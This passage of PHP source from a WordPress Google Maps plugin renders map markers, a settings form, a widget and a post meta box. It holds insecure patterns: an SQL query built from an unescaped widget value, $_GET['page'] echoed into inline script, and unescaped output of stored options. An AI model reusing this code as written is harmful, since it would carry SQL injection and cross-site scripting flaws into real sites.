	  foreach($map_locs as $map_loc) {
		$lat_lat = $wpdb->get_row($wpdb->prepare("SELECT location_latitude,location_longitude FROM ".$wpdb->prefix."map_locations where location_id=%d",$map_loc));
		$latitude = $lat_lat->location_latitude;
		$longitude = $lat_lat->location_longitude;
		$map->addpolyline($latitude,$longitude);
	  }
    }	  
} 
else {

  $map_address = unserialize($map_locations->map_locations);
	
	if( $map_address!='' ) {
		$address[] = array();
		
  foreach($map_address as $map_ad) {
   	
	$map_locations_records = $wpdb->get_row($wpdb->prepare("SELECT * FROM ".$wpdb->prefix."map_locations where location_id=%d",$map_ad));
    
  if(!empty($filter_options['category']) && $filter_options['category']!=$map_locations_records->location_group_map)
  continue;
    
	$group_marker = $wpdb->get_row($wpdb->prepare("SELECT * FROM ".$wpdb->prefix."group_map where group_map_id=%d",$map_locations_records->location_group_map));
	
	$wpgm_marker =  get_option('wpgmp_default_marker');
	
	$unmess_info_message = unserialize(base64_decode($map_locations_records->location_messages));
	
	$cat_marker_img = '';
	
	$location_id = $map_locations_records->location_id;
  $location_address = $map_locations_records->location_address;
	$latitude = $map_locations_records->location_latitude;
	$longitude = $map_locations_records->location_longitude;
	$title = $map_locations_records->location_title;
	$dragg = $map_locations_records->location_draggable;
  $animation = "";
	$infowindow_setting=unserialize($map_locations_records->location_settings);
  $cat_id = $group_marker->group_map_id;
  $cat_title = $group_marker->group_map_title;
  $cat_marker_img = $group_marker->group_marker;
	
	
	if($infowindow_setting['hide_infowindow']=='false')
	{
	$clickable = false;
	}	
	else
	$clickable = true;
	

  if( !empty($unmess_info_message['googlemap_infowindow_title_one']) )
  {  
	   $address['first']['title'] = $unmess_info_message['googlemap_infowindow_title_one'];
	}
  if( !empty($unmess_info_message['googlemap_infowindow_message_one']) )
  {
     $address['first']['message'] 	= $unmess_info_message['googlemap_infowindow_message_one'];
	}
  if( !empty($unmess_info_message['googlemap_infowindow_title_two']) )
  {
      $address['second']['title'] 	= $unmess_info_message['googlemap_infowindow_title_two'];
	}
  if( !empty($unmess_info_message['googlemap_infowindow_message_two']) )
  {
      $address['second']['message'] = $unmess_info_message['googlemap_infowindow_message_two'];
	}
  if( !empty($unmess_info_message['googlemap_infowindow_title_three']) )
  {
      $address['third']['title'] 		= $unmess_info_message['googlemap_infowindow_title_three'];
	}
  if( !empty($unmess_info_message['googlemap_infowindow_message_three']) )
  {
      $address['third']['message'] 	= $unmess_info_message['googlemap_infowindow_message_three'];
	}
  if( !empty($unmess_info_message['googlemap_infowindow_title_four']) )
  {
      $address['fourth']['title'] 	= $unmess_info_message['googlemap_infowindow_title_four'];
	}
  if( !empty($unmess_info_message['googlemap_infowindow_message_four']) )
  {
      $address['fourth']['message'] = $unmess_info_message['googlemap_infowindow_message_four'];
	}
  if( !empty($unmess_info_message['googlemap_infowindow_title_five']) )
  {
      $address['fifth']['title'] 		= $unmess_info_message['googlemap_infowindow_title_five'];
	}
  if( !empty($unmess_info_message['googlemap_infowindow_message_five']) )
  {
      $address['fifth']['message'] 	= $unmess_info_message['googlemap_infowindow_message_five'];
	}

  $address = array_filter($address);
	
	if( $un_map_cluster_setting['marker_cluster']=='true' ){
		
		$map->addMarker($location_id,$location_address,$latitude,$longitude,$clickable,$title,$address,$cat_marker_img,'',$dragg,$animation,$cat_id,$cat_title);
	} else {
		
		if( !empty($address['first']['title']) || !empty($address['first']['message']) || !empty($address['second']['title']) || !empty($address['second']['message']) || !empty($address['third']['title']) || !empty($address['third']['message']) || !empty($address['fourth']['title']) || !empty($address['fourth']['title']) || !empty($address['fifth']['title']) || !empty($address['fifth']['message']) ) {
			
			$map->addMarker($location_id,$location_address,$latitude,$longitude,$clickable,$title,$address,$cat_marker_img,'',$dragg,$animation,$cat_id,$cat_title);
		
    } else {
			
			wp_print_scripts( 'wpgmp_map' );
			
			$new_loc_adds = array();
			
			$new_loc_adds = $map_locations_records->location_address;
			
			$map->addMarker($location_id,$location_address,$latitude,$longitude,$clickable,$title,$new_loc_adds,$cat_marker_img,'',$dragg,$animation,$cat_id,$cat_title);
				
	    }
	}
   }
  }
 }
} elseif( $content ) {
	wp_print_scripts( 'wpgmp_map' );
	if( empty($zoom) || empty($width) || empty($height) || empty($title) ) {
		$map->zoom = 14;
		$map->width = '600';
		$map->height = '400';
		$map->title = 'WP Google Map Pro';
	} else {
		$map->zoom = $zoom;
		$map->width = $width;
		$map->height = $height;
		$map->title = $title;
	}
	
	$address = '';
	$coordinates = wpgmp_get_coordinates( $content );
	$address = '<h3>'.$coordinates["address"].'</h3>';
	$address .= '<p>Latitude='.$coordinates["lat"].'</p>';
	$address .= '<p>Longitude='.$coordinates["lng"].'</p>';
	$map->center_lat = $coordinates['lat'];
	$map->center_lng = $coordinates['lng'];
	$map->addMarker($map->center_lat,$map->center_lng,'true',$map->title,$address);
 
   if( !is_array( $coordinates ) )
   return;
} else {
	
	return "Thank you for using this plugin. Please <a href='".admin_url('admin.php?page=wpgmp_add_location')."'>Add your locations</a> or set plugin <a href='".admin_url('admin.php?page=wpgmp_google_settings')."'>Settings</a>.";
}


	
 echo $map->showmap();
 $content =  ob_get_contents();
 ob_clean();
 
 return $content;
 
}
/**
 * This function used to show success/failure message in backend.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
 
function wpgmp_settings(){
?>
<div class="wpgmp-wrap"> 
	<div class="col-md-11">   
		<div id="icon-options-general" class="icon32"><br></div>
		<h3><span class="glyphicon glyphicon-asterisk"></span><?php _e( 'Google WP Map Pro Settings', 'wpgmp_google_map' ) ?></h3>

		<div class="wpgmp-overview">
			<form method="post" action="options.php">  
				<?php wp_nonce_field('update-options') ?>  
				<p>
					<a href="<?php echo get_bloginfo('siteurl'); ?>/wp-admin/admin.php?page=wpgmp_add_location"><?php _e( 'Click Here', 'wpgmp_google_map' ) ?></a>&nbsp; <?php _e( 'to add a new location or', 'wpgmp_google_map' ) ?>&nbsp;<a href="<?php echo get_bloginfo('siteurl'); ?>/wp-admin/admin.php?page=wpgmp_manage_location"><?php _e( 'Browse', 'wpgmp_google_map' ) ?></a>&nbsp; <?php _e( 'your existings locations.', 'wpgmp_google_map' ) ?>
				</p>
       
				<div class="form-horizontal">
					<fieldset><legend>General Setting</legend>
						<div class="row">
							<div class="col-md-3"><label for="wpgmp_zoomlevel"><?php _e( 'Zoom Level', 'wpgmp_google_map' ) ?></label></div>
							<div class="col-md-7">
								<input type="text" class="form-control" name="wpgmp_zoomlevel" size="45" value="<?php echo get_option('wpgmp_zoomlevel'); ?>" />
								<p class="description"><?php _e( 'Choose Zoom Level between 1 to 19. Default is 14.', 'wpgmp_google_map' ) ?> </p>
							</div>
						</div>
				   
						<div class="row">
							<div class="col-md-3"><label for="wpgmp_centerlatitude"><?php _e( 'Center Latitude', 'wpgmp_google_map' ) ?></label></div>
							<div class="col-md-7">
								<input type="text"  class="form-control" name="wpgmp_centerlatitude" size="45" value="<?php echo get_option('wpgmp_centerlatitude'); ?>" />
								<p class="description"><?php _e( 'Write down center location on the map.', 'wpgmp_google_map' ) ?></p>
							</div>
						</div>   
				 
						 <div class="row">   	
							<div class="col-md-3"><label for="wpgmp_centerlongitude"><?php _e( 'Center Longitude', 'wpgmp_google_map' ) ?></label></div>
							<div class="col-md-7">
								<input type="text" class="form-control" name="wpgmp_centerlongitude" size="45" value="<?php echo get_option('wpgmp_centerlongitude'); ?>" />
								<p class="description"><?php _e( 'Write down center location on the map.', 'wpgmp_google_map' ) ?></p>
							</div>
						</div>     
					
						<div class="row">	
							<div class="col-md-3"><label for="wpgmp_language"><?php _e( 'Select Language', 'wpgmp_google_map' ) ?></label></div>
							<div class="col-md-7">
								<select name="wpgmp_language" class="form-control">
									<option value="en"<?php selected(get_option('wpgmp_language'),'en') ?>><?php _e( 'ENGLISH', 'wpgmp_google_map' ) ?></option>
									<option value="ar"<?php selected(get_option('wpgmp_language'),'ar') ?>><?php _e( 'ARABIC', 'wpgmp_google_map' ) ?></option>
									<option value="eu"<?php selected(get_option('wpgmp_language'),'eu') ?>><?php _e( 'BASQUE', 'wpgmp_google_map' ) ?></option>
									<option value="bg"<?php selected(get_option('wpgmp_language'),'bg') ?>><?php _e( 'BULGARIAN', 'wpgmp_google_map' ) ?></option>
									<option value="bn"<?php selected(get_option('wpgmp_language'),'bn') ?>><?php _e( 'BENGALI', 'wpgmp_google_map' ) ?></option>
									<option value="ca"<?php selected(get_option('wpgmp_language'),'ca') ?>><?php _e( 'CATALAN', 'wpgmp_google_map' ) ?></option>
									<option value="cs"<?php selected(get_option('wpgmp_language'),'cs') ?>><?php _e( 'CZECH', 'wpgmp_google_map' ) ?></option>
									<option value="da"<?php selected(get_option('wpgmp_language'),'da') ?>><?php _e( 'DANISH', 'wpgmp_google_map' ) ?></option>
									<option value="de"<?php selected(get_option('wpgmp_language'),'de') ?>><?php _e( 'GERMAN', 'wpgmp_google_map' ) ?></option>
									<option value="el"<?php selected(get_option('wpgmp_language'),'el') ?>><?php _e( 'GREEK', 'wpgmp_google_map' ) ?></option>
									<option value="en-AU"<?php selected(get_option('wpgmp_language'),'en-AU') ?>><?php _e( 'ENGLISH (AUSTRALIAN)', 'wpgmp_google_map' ) ?></option>
									<option value="en-GB"<?php selected(get_option('wpgmp_language'),'en-GB') ?>><?php _e( 'ENGLISH (GREAT BRITAIN)', 'wpgmp_google_map' ) ?></option>
									<option value="es"<?php selected(get_option('wpgmp_language'),'es') ?>><?php _e( 'SPANISH', 'wpgmp_google_map' ) ?></option>
									<option value="fa"<?php selected(get_option('wpgmp_language'),'fa') ?>><?php _e( 'FARSI', 'wpgmp_google_map' ) ?></option>
									<option value="fi"<?php selected(get_option('wpgmp_language'),'fi') ?>><?php _e( 'FINNISH', 'wpgmp_google_map' ) ?></option>
									<option value="fil"<?php selected(get_option('wpgmp_language'),'fil') ?>><?php _e( 'FILIPINO', 'wpgmp_google_map' ) ?></option>
									<option value="fr"<?php selected(get_option('wpgmp_language'),'fr') ?>><?php _e( 'FRENCH', 'wpgmp_google_map' ) ?></option>
									<option value="gl"<?php selected(get_option('wpgmp_language'),'gl') ?>><?php _e( 'GALICIAN', 'wpgmp_google_map' ) ?></option>
									<option value="gu"<?php selected(get_option('wpgmp_language'),'gu') ?>><?php _e( 'GUJARATI', 'wpgmp_google_map' ) ?></option>
									<option value="hi"<?php selected(get_option('wpgmp_language'),'hi') ?>><?php _e( 'HINDI', 'wpgmp_google_map' ) ?></option>
									<option value="hr"<?php selected(get_option('wpgmp_language'),'hr') ?>><?php _e( 'CROATIAN', 'wpgmp_google_map' ) ?></option>
									<option value="hu"<?php selected(get_option('wpgmp_language'),'hu') ?>><?php _e( 'HUNGARIAN', 'wpgmp_google_map' ) ?></option>
									<option value="id"<?php selected(get_option('wpgmp_language'),'id') ?>><?php _e( 'INDONESIAN', 'wpgmp_google_map' ) ?></option>
									<option value="it"<?php selected(get_option('wpgmp_language'),'it') ?>><?php _e( 'ITALIAN', 'wpgmp_google_map' ) ?></option>
									<option value="iw"<?php selected(get_option('wpgmp_language'),'iw') ?>><?php _e( 'HEBREW', 'wpgmp_google_map' ) ?></option>
									<option value="ja"<?php selected(get_option('wpgmp_language'),'ja') ?>><?php _e( 'JAPANESE', 'wpgmp_google_map' ) ?></option>
									<option value="kn"<?php selected(get_option('wpgmp_language'),'kn') ?>><?php _e( 'KANNADA', 'wpgmp_google_map' ) ?></option>
									<option value="ko"<?php selected(get_option('wpgmp_language'),'ko') ?>><?php _e( 'KOREAN', 'wpgmp_google_map' ) ?></option>
									<option value="lt"<?php selected(get_option('wpgmp_language'),'lt') ?>><?php _e( 'LITHUANIAN', 'wpgmp_google_map' ) ?></option>
									<option value="lv"<?php selected(get_option('wpgmp_language'),'lv') ?>><?php _e( 'LATVIAN', 'wpgmp_google_map' ) ?></option>
									<option value="ml"<?php selected(get_option('wpgmp_language'),'ml') ?>><?php _e( 'MALAYALAM', 'wpgmp_google_map' ) ?></option>
									<option value="mr"<?php selected(get_option('wpgmp_language'),'mr') ?>><?php _e( 'MARATHI', 'wpgmp_google_map' ) ?></option>
									<option value="nl"<?php selected(get_option('wpgmp_language'),'nl') ?>><?php _e( 'DUTCH', 'wpgmp_google_map' ) ?></option>
									<option value="no"<?php selected(get_option('wpgmp_language'),'no') ?>><?php _e( 'NORWEGIAN', 'wpgmp_google_map' ) ?></option>
									<option value="pl"<?php selected(get_option('wpgmp_language'),'pl') ?>><?php _e( 'POLISH', 'wpgmp_google_map' ) ?></option>
									<option value="pt"<?php selected(get_option('wpgmp_language'),'pt') ?>><?php _e( 'PORTUGUESE', 'wpgmp_google_map' ) ?></option>
									<option value="pt-BR"<?php selected(get_option('wpgmp_language'),'pt-BR') ?>><?php _e( 'PORTUGUESE (BRAZIL)', 'wpgmp_google_map' ) ?></option>
									<option value="pt-PT"<?php selected(get_option('wpgmp_language'),'pt-PT') ?>><?php _e( 'PORTUGUESE (PORTUGAL)', 'wpgmp_google_map' ) ?></option>
									<option value="ro"<?php selected(get_option('wpgmp_language'),'ro') ?>><?php _e( 'ROMANIAN', 'wpgmp_google_map' ) ?></option>
									<option value="ru"<?php selected(get_option('wpgmp_language'),'ru') ?>><?php _e( 'RUSSIAN', 'wpgmp_google_map' ) ?></option>
									<option value="sk"<?php selected(get_option('wpgmp_language'),'sk') ?>><?php _e( 'SLOVAK', 'wpgmp_google_map' ) ?></option>
									<option value="sl"<?php selected(get_option('wpgmp_language'),'sl') ?>><?php _e( 'SLOVENIAN', 'wpgmp_google_map' ) ?></option>
									<option value="sr"<?php selected(get_option('wpgmp_language'),'sr') ?>><?php _e( 'SERBIAN', 'wpgmp_google_map' ) ?></option>
									<option value="sv"<?php selected(get_option('wpgmp_language'),'sv') ?>><?php _e( 'SWEDISH', 'wpgmp_google_map' ) ?></option>
									<option value="tl"<?php selected(get_option('wpgmp_language'),'tl') ?>><?php _e( 'TAGALOG', 'wpgmp_google_map' ) ?></option>
									<option value="ta"<?php selected(get_option('wpgmp_language'),'ta') ?>><?php _e( 'TAMIL', 'wpgmp_google_map' ) ?></option>
									<option value="te"<?php selected(get_option('wpgmp_language'),'te') ?>><?php _e( 'TELUGU', 'wpgmp_google_map' ) ?></option>
									<option value="th"<?php selected(get_option('wpgmp_language'),'th') ?>><?php _e( 'THAI', 'wpgmp_google_map' ) ?></option>
									<option value="tr"<?php selected(get_option('wpgmp_language'),'tr') ?>><?php _e( 'TURKISH', 'wpgmp_google_map' ) ?></option>
									<option value="uk"<?php selected(get_option('wpgmp_language'),'uk') ?>><?php _e( 'UKRAINIAN', 'wpgmp_google_map' ) ?></option>
									<option value="vi"<?php selected(get_option('wpgmp_language'),'vi') ?>><?php _e( 'VIETNAMESE', 'wpgmp_google_map' ) ?></option>
									<option value="zh-CN"<?php selected(get_option('wpgmp_language'),'zh-CN') ?>><?php _e( 'CHINESE (SIMPLIFIED)', 'wpgmp_google_map' ) ?></option>
									<option value="zh-TW"<?php selected(get_option('wpgmp_language'),'zh-TW') ?>><?php _e( 'CHINESE (TRADITIONAL)', 'wpgmp_google_map' ) ?></option>
								</select>
								<p class="description"><?php _e( 'Default is English.', 'wpgmp_google_map' ) ?></p>
							</div>
						</div>
</fieldset>
		  
						 <input type="hidden" name="action" value="update" />  
						<input type="hidden" name="page_options" value="wpgmp_zoomlevel,wpgmp_centerlatitude,wpgmp_centerlongitude,wpgmp_mapwidth,wpgmp_mapheight,wpgmp_language,wpgmp_mashup,wpgmp_categorydisplayformat" />  
						  
						<div class="row">
							<div class="col-md-3"></div>
							<div class="col-md-7">  
								<input type="submit" name="submit" id="submit" class="btn btn-lg btn-primary" value="<?php _e( 'Save Changes', 'wpgmp_google_map' ) ?>">
							</div>
						</div>
				</div>
			
			
			
			</form>
		</div> 
	</div>
</div>    
<?php
}
/**
 * This function used to show success/failure message in backend.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
function wpgmp_google_map_widget(){
	register_widget('wpgmp_google_map_widget');
}
/**
 * This class used to add widget support in backend.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
class wpgmp_google_map_widget extends WP_Widget{
	public function __construct()
	{
		parent::__construct(
			'wpgmp_google_map_widget',
			'WP Google Map Pro',
			array('description' => __('A widget that displays the google map' , 'wpgmp_google_map'))
		);
	}
	function widget( $args, $instance )
	{
		global $wpdb;
		extract($args);
		$title=$instance['title'];
		$map_title = $wpdb->get_row("SELECT * FROM ".$wpdb->prefix."create_map where map_id='".$title."'");
		
		if($title)
			echo $before_title . $map_title->map_title . $after_title;
		
		echo do_shortcode('[put_wpgm id='.$title.']' );
	
	}
	function update( $new_instance, $old_instance )
	{
		$instance=$old_instance;
		$instance['title']=strip_tags($new_instance['title']);
		update_option('wpgmp_short_mapselect_marker' , $mark);
		return $instance;
	}
	function form( $instance )
	{
	
	global $wpdb;
	$map_records = $wpdb->get_results($wpdb->prepare("SELECT * FROM ".$wpdb->prefix."create_map",NULL));
	?>
	
		<p>
			<label for="<?php echo $this->get_field_id('title');?>" style="font-weight:bold;"><?php _e('Select Your Map:' , 'wpgmp_google_map');?>
			</label> 
				<select id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name( 'title' ); ?>" style="width:80%;">
                <option value=""><?php _e( 'Select map', 'wpgmp_google_map' ) ?></option>
				<?php foreach($map_records as $key => $map_record){  ?>
 				<option value="<?php echo $map_record->map_id; ?>"<?php selected($map_record->map_id,$instance['title']); ?>><?php echo $map_record->map_title; ?></option>
				<?php } ?>	
				</select>
        </p>        
	<?php	
	}
}
/**
 * This function used to register google map script.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
function wpgmp_scripts_method(){
	wp_enqueue_script("jquery");
    wp_enqueue_script('wpgmp_map','http://www.google.com/jsapi');
    wp_enqueue_script('wpgmp_googlemap_script',plugins_url('/js/wpgmp-google-map.js', __FILE__));

    
}
/**
 * This function used to enable marker clusters.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
 
function wpgmp_accordian_script(){
	
	wp_enqueue_script('wpgmp_accordian_script',plugins_url('/js/jquery.accordion.js', __FILE__));
	wp_enqueue_script('wpgmp_mousewheel_script',plugins_url('/js/jquery.mousewheel.js', __FILE__));
	wp_enqueue_script('wpgmp_jscrollpane_script',plugins_url('/js/jquery.jscrollpane.min.js', __FILE__));
}


function wpgmp_frontend_css(){
	wp_enqueue_style('wpgmp_frontend_css',plugins_url( '/css/wpgmp-frontend.css' , __FILE__ ));
}
 
function wpgmp_markercluster_script(){
	wp_enqueue_script('wpgmp_markercluster_script',plugins_url('/js/markerclusterer.js', __FILE__));
}

add_action('wp_head','wpgmp_ajaxurl');
function wpgmp_ajaxurl() {
?>
<script type="text/javascript">
var wpgmp_ajaxurl = '<?php echo admin_url('admin-ajax.php'); ?>';
</script>
<?php
}


/**
 * This function used to load css in backend.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
function wpgmp_google_map_load(){
wp_enqueue_style('google_map_css',plugins_url( '/css/google-map.css' , __FILE__ ));
}
  
function wpgmp_excerpt_more(){
 return '<br /><a class="read-more" href="'. get_permalink( get_the_ID() ) . '" target="_blank">Read More</a>';
}

function get_the_mashup_content(){
  $msg_str = '<div style="width:400px; height:300px;">';
  $msg_str .= '<a href="'.get_permalink(get_the_ID()).'" target="_blank">'.get_the_title().'</a><br />';
  
  if(has_post_thumbnail()){
   $attach_id = get_post_thumbnail_id();
   $thumb = wp_get_attachment_image_src( $attach_id, 'thumbnail');
   $msg_str .= '<br /><a href="'.get_permalink(get_the_ID()).'" target="_blank"><img src="'.$thumb[0].'" style="float:left; margin-right:20px; margin-top:7px;" /></a>';
  }
  
  $msg_str .= get_the_excerpt();
  $msg_str .= '</div>';
  return $msg_str;
}


/**
 * Adds a box to the main column on the Post and Page edit screens.
 */
 
function wpgmp_call_meta_box() {
	
	$screens = array( 'post','page' );
	
	$args = array(
		'public' 	=> true,
		'_builtin' 	=> false
);
$custom_post_types = get_post_types($args, 'names');

$screens = array_merge($screens,$custom_post_types);

$screens = apply_filters("wpgmp_geotags_post_types",$screens);
	
	foreach ( $screens as $screen ) {

		add_meta_box(
			'wpgmp_google_mapid',
			__( 'WP Google Map Pro', 'wpgmp_google_map' ),
			'wpgmp_add_meta_box',
			$screen
		);
	}
}

add_action( 'add_meta_boxes', 'wpgmp_call_meta_box' );

function wpgmp_add_meta_box( $post ) {
  global $wpdb;
	wp_nonce_field( 'myplugin_meta_box', 'wpgmp_meta_box_nonce' );
	$wpgmp_location_address = get_post_meta( $post->ID, '_wpgmp_location_address', true );
	$wpgmp_map_id = unserialize(get_post_meta( $post->ID, '_wpgmp_map_id', true ));
	
	$wpgmp_metabox_marker_id = get_post_meta( $post->ID, '_wpgmp_metabox_marker_id', true );
	$wpgmp_metabox_latitude = get_post_meta( $post->ID, '_wpgmp_metabox_latitude', true );
	$wpgmp_metabox_longitude = get_post_meta( $post->ID, '_wpgmp_metabox_longitude', true );
	$all_maps =  $wpdb->get_results($wpdb->prepare('SELECT * FROM '.$wpdb->prefix.'create_map',NULL));
	$all_marker_group =  $wpdb->get_results($wpdb->prepare('SELECT * FROM '.$wpdb->prefix.'group_map',NULL)); 
?>
<script src="http://maps.google.com/maps/api/js?libraries=places&region=uk&language=en&sensor=false"></script>
<script>
function initialize() {
  wpgmp_get_page = '<?php echo $_GET['page']; ?>';
  if(wpgmp_get_page=='') {
    var wpgmp_metabox_location = document.getElementById('wpgmp_metabox_location'); 
    var autocmt = new google.maps.places.Autocomplete(wpgmp_metabox_location, { types: ["geocode"] });
    google.maps.event.addListener(autocmt, 'place_changed', function (event) {  
       var meta_place = autocmt.getPlace(); 
       document.getElementById('wpgmp_metabox_latitude').value = meta_place.geometry.location.lat();
       document.getElementById('wpgmp_metabox_longitude').value = meta_place.geometry.location.lng();
      });
  }
}
google.maps.event.addDomListener(window, 'load', initialize);
</script>

<p>
	<label for="wpgmp_enter_location"><?php _e( 'Enter Location :', 'wpgmp_google_map' ); ?></label>
	<input type="text" id="wpgmp_metabox_location" name="wpgmp_metabox_location" value="<?php echo $wpgmp_location_address; ?>" size="25" />
</p>
<p>
	<label for="wpgmp_enter_location"><?php _e( 'Latitude :', 'wpgmp_google_map' ); ?></label>
	<input type="text" id="wpgmp_metabox_latitude" name="wpgmp_metabox_latitude" value="<?php echo $wpgmp_metabox_latitude; ?>" size="25" />
	<label for="wpgmp_enter_location"><?php _e( 'Longitude :', 'wpgmp_google_map' ); ?></label>
	<input type="text" id="wpgmp_metabox_longitude" name="wpgmp_metabox_longitude" value="<?php echo $wpgmp_metabox_longitude; ?>" size="25" />
</p>
<p>	
   <label><?php _e( 'Select Marker Group :', 'wpgmp_google_map' ) ?></label>
   <select name="wpgmp_metabox_marker_id" id="wpgmp_metabox_marker_id">
   <option value="">Select Marker Group</option>
	   <?php foreach($all_marker_group as $all_marker): ?>
			<option value="<?php echo $all_marker->group_map_id ?>" <?php selected($all_marker->group_map_id,$wpgmp_metabox_marker_id) ?>><?php echo $all_marker->group_map_title; ?></option>
	   <?php endforeach; ?>
   </select>
</p> 
<p>	
   <label><?php _e( 'Select Map :&nbsp;&nbsp;', 'wpgmp_google_map' ) ?></label>
   <table>
   <?php 
   
   if(count($all_maps)>0)
   {
   foreach($all_maps as $map): 
   
   if(is_array($wpgmp_map_id) and in_array($map->map_id,$wpgmp_map_id))
   $c="checked=checked";
   else
   $c='';
   
   ?>
   <tr>
	   <td><input <?php echo $c; ?> type="checkbox" name="wpgmp_metabox_mapid[]" value="<?php echo $map->map_id ?>">&nbsp; <?php echo $map->map_title; ?></td>
    </tr>
    <?php endforeach; 
}
else
{
	_e( 'Please <a href="'.admin_url("admin.php?page=wpgmp_create_map").'">create a map</a> first.', 'wpgmp_google_map' ); 
	
	}
    ?> 
   </table>
</p>   
<?php  
}

function wpgmp_save_meta_box_data( $post_id ) {

	if ( ! isset( $_POST['wpgmp_meta_box_nonce'] ) ) {
		return;
	}

	$wpgmp_enter_location = sanitize_text_field( $_POST['wpgmp_metabox_location'] );
	$wpgmp_metabox_latitude = sanitize_text_field( $_POST['wpgmp_metabox_latitude'] );
	$wpgmp_metabox_longitude = sanitize_text_field( $_POST['wpgmp_metabox_longitude'] );
	$wpgmp_map_id = sanitize_text_field( serialize($_POST['wpgmp_metabox_mapid']) );
	$wpgmp_metabox_marker_id = sanitize_text_field( $_POST['wpgmp_metabox_marker_id'] );

	// Update the meta field in the database.
	update_post_meta( $post_id, '_wpgmp_location_address', $wpgmp_enter_location );
	update_post_meta( $post_id, '_wpgmp_metabox_latitude', $wpgmp_metabox_latitude );
	update_post_meta( $post_id, '_wpgmp_metabox_longitude', $wpgmp_metabox_longitude );
	update_post_meta( $post_id, '_wpgmp_map_id', $wpgmp_map_id );
	update_post_meta( $post_id, '_wpgmp_metabox_marker_id', $wpgmp_metabox_marker_id );
}
add_action( 'save_post', 'wpgmp_save_meta_box_data' );
 
 
/**
 * This function used to create tab.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
function wpgmp_google_map_tabs_filter($tabs)
{
        $newtab = array('ell_insert_gmap_tab' => __('Choose Icons','wpgmp_google_map'));
        return array_merge($tabs,$newtab);
}
 
function wpgmp_google_map_media_upload_tab() {
	
    return wp_iframe('wpgmp_google_map_icon', $errors );
}
function wpgmp_google_map_icon()
{
echo media_upload_header();
$form_action_url = site_url( "wp-admin/media-upload.php?type={$GLOBALS['type']}&tab=ell_insert_gmap_tab", 'admin');
?>
<script type="text/javascript">
 function add_icon_to_images()
 {
	  if(jQuery('.read_icons').hasClass('active'))
	  {	  
	  	imgsrc = jQuery('.active').find('img').attr('src');
   		
		var win = window.dialogArguments || opener || parent || top;
   		
		win.send_icon_to_map(imgsrc);
  		
	  }
	  else
	  {
   		alert('Choose your icon.');
  	  }
 }
</script>
<form enctype="multipart/form-data" method="post" action="<?php echo esc_attr($form_action_url); ?>" class="media-upload-form" id="library-form">
<h3 class="media-title" style="color: #5A5A5A; font-family: Georgia, 'Times New Roman', Times, serif; font-weight: normal; font-size: 1.6em; margin-left: 10px;"><?php _e( 'Select Icons', 'wpgmp_google_map' ) ?></h3>
<div style="margin-bottom:30px; float:left;">
<ul style="margin-left:10px; float:left;" id="select_icons">
<?php
$dir = plugin_dir_path( __FILE__ ) . 'icons/';

    $file_display = array('jpg', 'jpeg', 'png', 'gif');

    if (file_exists($dir) == false) {
      echo 'Directory \'', $dir, '\' not found!';
    } 
    else {
      $dir_contents = scandir($dir);

      foreach ($dir_contents as $file) {
           
           $file_type = strtolower(end(explode('.', $file)));

           if ($file !== '.' && $file !== '..' && in_array($file_type, $file_display) == true) {
           ?>
            <li class="read_icons" style="float:left;"> 
                  <img src="<?php echo plugins_url('/icons/'.$file.'', __FILE__ ); ?>" style="cursor:pointer;" />
            </li>
           <?php
           }
      }
    }
?>
</ul>
<button type="button" class="button" style="margin-left:10px;" value="1" onclick="add_icon_to_images();" name="send[<?php echo $picid ?>]"><?php _e( 'Insert into Post', 'wpgmp_google_map' ) ?></button>
</div>
</form>
<?php
}  
 
/**
 * This function used to registered all action.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
  
 
 
function wpgmp_load_actions()
{
wpgmp_scripts_method();	
wpgmp_frontend_css();
add_action('media_upload_ell_insert_gmap_tab', 'wpgmp_google_map_media_upload_tab');
add_filter('media_upload_tabs', 'wpgmp_google_map_tabs_filter');
add_action('admin_menu', 'wpgmp_google_map_page');
add_shortcode('put_wpgm','wpgmp_show_location_in_map');
add_shortcode('put_wpgm_locations','wpgmp_display_map_location');
add_shortcode('display_map','wpgmp_display_map');
add_action('admin_print_scripts', 'wpgmp_admin_scripts');
add_action('admin_print_styles', 'wpgmp_admin_styles');
add_action('admin_head', 'wpgmp_function_js');
add_shortcode('post_info','return_post_content');
}

function wpgmp_load_actions_admin()
{
	wpgmp_google_map_load();
	add_action('admin_head','wpgmp_admin_js');
}
function wpgmp_admin_js()
{
	
	?>
	<script>
	function get_shapes_options(shape)
{
	jQuery("#options_fillcolor").val(shape.fillColor);
	jQuery("#options_fillopacity").val(shape.fillOpacity);
	jQuery("#options_color").val(shape.strokeColor);
	jQuery("#options_stroke_thickness").val(shape.strokeWeight);
	jQuery("#options_stroke_opacity").val(shape.strokeOpacity);}
	
function set_shapes_options(shape)
{
	var polyOptions2 = {
	fillColor:  "#"+jQuery("#options_fillcolor").val(),	
	fillOpacity: jQuery("#options_fillopacity").val(),	
    strokeColor: "#"+jQuery("#options_color").val(),
    strokeOpacity: jQuery("#options_stroke_opacity").val(),
    strokeWeight: jQuery("#options_stroke_thickness").val()
    }
	shape.setOptions(polyOptions2);
}
function wpgmp_save_shapes(allcordinate)
{
  jQuery("#shapes_values").val(allcordinate.join("|"));
  jQuery("#save_map").submit();
}
function wpgmp_shape_complete(shape)
{
	shape.setEditable(false);
	google.maps.event.addListener(shape, "click", function(){
	
	shape.setEditable(true);
	
	get_shapes_options(shape);	
	}); 
	
	google.maps.event.addListener(shape, "rightclick", function(){
	
	shape.setEditable(true);
	
	set_shapes_options(shape);	
	}); }

function wpgmp_save_polylines()
{
	
	var all_polylines = [];
        
         for (var i = 0; i < wgmp_polylines.length; i++) {
                            
                            var polyline_cordinate= [];
                            
                            var cordinates=wgmp_polylines[i].getPath();
                            
                            var settings=wgmp_polylines[i].strokeWeight+","+wgmp_polylines[i].strokeOpacity+","+wgmp_polylines[i].strokeColor;
                            
                            cordinates.forEach(function(latlng,index)
                            {
							
									var latlngin= [latlng.lat(),latlng.lng()];
